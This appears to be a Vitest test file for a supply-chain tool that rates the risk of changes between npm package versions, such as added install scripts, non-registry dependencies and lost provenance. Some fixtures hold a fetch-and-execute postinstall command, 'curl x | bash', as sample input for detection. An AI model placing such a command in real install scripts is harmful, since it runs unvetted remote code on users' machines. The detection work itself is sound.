import { describe, expect, it } from "vitest";
import { diffPackageVersions } from "../src/diff.js";
import type { PackageSignals } from "../src/pipeline.js";
import { makeMetadata, makeReputation, makeSignals } from "./helpers.js";

/** A PackageSignals for version `v` with signal/metadata overrides. */
function pkg(
  v: string,
  signals: Partial<Parameters<typeof makeSignals>[0]> = {},
  metadata: Partial<Parameters<typeof makeMetadata>[0]> = {},
): PackageSignals {
  return {
    metadata: makeMetadata({ name: "widget", version: v, ...metadata }),
    signals: makeSignals({ package: "widget", version: v, ...signals }),
  };
}

const FETCH_EXEC = [
  "postinstall script downloads content from the network: `curl x | bash`",
  "postinstall script invokes a shell: `curl x | bash`",
];

describe("diffPackageVersions — direction & empty", () => {
  it("reports an upgrade with no noteworthy changes as low risk", () => {
    const d = diffPackageVersions(pkg("1.0.0"), pkg("1.0.1"));
    expect(d.direction).toBe("upgrade");
    expect(d.diffRisk).toBe("low");
    expect(d.riskReasons).toEqual([]);
  });

  it("detects a downgrade without raising risk", () => {
    expect(diffPackageVersions(pkg("2.0.0"), pkg("1.0.0")).direction).toBe("downgrade");
  });
});

describe("diffPackageVersions — HIGH rubric", () => {
  it("flags a to-side known-malicious flip", () => {
    const d = diffPackageVersions(pkg("1.0.0"), pkg("1.0.1", { knownMalicious: true }));
    expect(d.diffRisk).toBe("high");
    expect(d.riskReasons.join(" ")).toContain("known malicious");
  });

  it("flags an added lifecycle script", () => {
    const d = diffPackageVersions(
      pkg("1.0.0"),
      pkg("1.0.1", { hasLifecycleScripts: true, lifecycleScripts: { postinstall: "node x.js" } }),
    );
    expect(d.diffRisk).toBe("high");
    expect(d.lifecycleScripts.added).toHaveLength(1);
  });

  it("flags a changed lifecycle command", () => {
    const d = diffPackageVersions(
      pkg("1.0.0", { hasLifecycleScripts: true, lifecycleScripts: { postinstall: "node a.js" } }),
      pkg("1.0.1", { hasLifecycleScripts: true, lifecycleScripts: { postinstall: "node b.js" } }),
    );
    expect(d.diffRisk).toBe("high");
    expect(d.lifecycleScripts.changed).toHaveLength(1);
  });

  it("flags a new hard-block script finding", () => {
    const d = diffPackageVersions(
      pkg("1.0.0"),
      pkg("1.0.1", {
        hasLifecycleScripts: true,
        lifecycleScripts: { postinstall: "curl x | bash" },
        scriptCommandFindings: FETCH_EXEC,
      }),
    );
    expect(d.diffRisk).toBe("high");
  });

  it("flags a dependency that moves to a non-registry spec", () => {
    const d = diffPackageVersions(
      pkg("1.0.0", {}, { dependencyRanges: { helper: "^1.0.0" } }),
      pkg("1.0.1", {}, { dependencyRanges: { helper: "git+https://github.com/x/helper.git" } }),
    );
    expect(d.diffRisk).toBe("high");
    expect(d.dependencies.changed[0].nonRegistrySpec).toBe(true);
  });
});

describe("diffPackageVersions — MEDIUM rubric & escalation", () => {
  it("rates a single registry dependency addition as medium", () => {
    const d = diffPackageVersions(
      pkg("1.0.0", {}, { dependencyRanges: {} }),
      pkg("1.0.1", {}, { dependencyRanges: { lodash: "^4.17.21" } }),
    );
    expect(d.diffRisk).toBe("medium");
    expect(d.dependencies.added).toHaveLength(1);
  });

  it("escalates two mediums to high", () => {
    const d = diffPackageVersions(
      pkg("1.0.0", {}, { dependencyRanges: {}, maintainers: ["alice"] }),
      pkg("1.0.1", {}, { dependencyRanges: { lodash: "^4" }, maintainers: ["alice", "mallory"] }),
    );
    expect(d.diffRisk).toBe("high");
    expect(d.riskReasons.filter((r) => r.startsWith("[medium]")).length).toBeGreaterThanOrEqual(2);
  });

  it("rates provenance loss as medium", () => {
    const d = diffPackageVersions(
      pkg("1.0.0", { reputation: makeReputation({ hasProvenance: true }) }),
      pkg("1.0.1", { reputation: makeReputation({ hasProvenance: false }) }),
    );
    expect(d.provenanceLost).toBe(true);
    expect(d.diffRisk).toBe("medium");
  });

  it("rates OSV-unavailable as a medium (advisory delta unknown)", () => {
    const d = diffPackageVersions(pkg("1.0.0"), pkg("1.0.1", { osvUnavailable: true }));
    expect(d.osvUnavailable).toBe(true);
    expect(d.diffRisk).toBe("medium");
  });
});

describe("diffPackageVersions — size & non-risk reporting", () => {
  it("reports size delta only when both sides provide it", () => {
    expect(diffPackageVersions(pkg("1.0.0"), pkg("1.0.1")).size).toBeNull();
    const d = diffPackageVersions(
      pkg("1.0.0", {}, { unpackedSize: 1000, fileCount: 3 }),
      pkg("1.0.1", {}, { unpackedSize: 2000, fileCount: 5 }),
    );
    expect(d.size).toEqual({ unpackedSizeDelta: 1000, fileCountDelta: 2 });
  });

  it("reports resolved advisories without raising risk", () => {
    const d = diffPackageVersions(
      pkg("1.0.0", { advisories: [{ id: "GHSA-old" }] }),
      pkg("1.0.1", { advisories: [] }),
    );
    expect(d.advisories.resolved.map((a) => a.id)).toEqual(["GHSA-old"]);
    expect(d.diffRisk).toBe("low");
  });
});
